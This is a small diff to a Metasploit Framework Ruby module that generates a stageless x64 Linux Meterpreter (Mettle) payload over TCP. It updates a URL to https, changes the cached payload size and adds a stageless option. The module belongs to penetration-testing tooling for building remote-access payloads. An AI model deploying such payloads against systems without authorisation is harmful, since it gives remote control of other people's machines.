@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -10,7 +10,7 @@ require 'msf/base/sessions/meterpreter_x64_linux'
 
 module MetasploitModule
 
-  CachedSize = 700032
+  CachedSize = 729184
 
   include Msf::Payload::Single
   include Msf::Sessions::MeterpreterOptions
@@ -36,7 +36,10 @@ module MetasploitModule
   end
 
   def generate
-    opts = {scheme: 'tcp'}
+    opts = {
+      scheme: 'tcp',
+      stageless: true
+    }
     MetasploitPayloads::Mettle.new('x86_64-linux-musl', generate_config(opts)).to_binary :exec
   end
 end
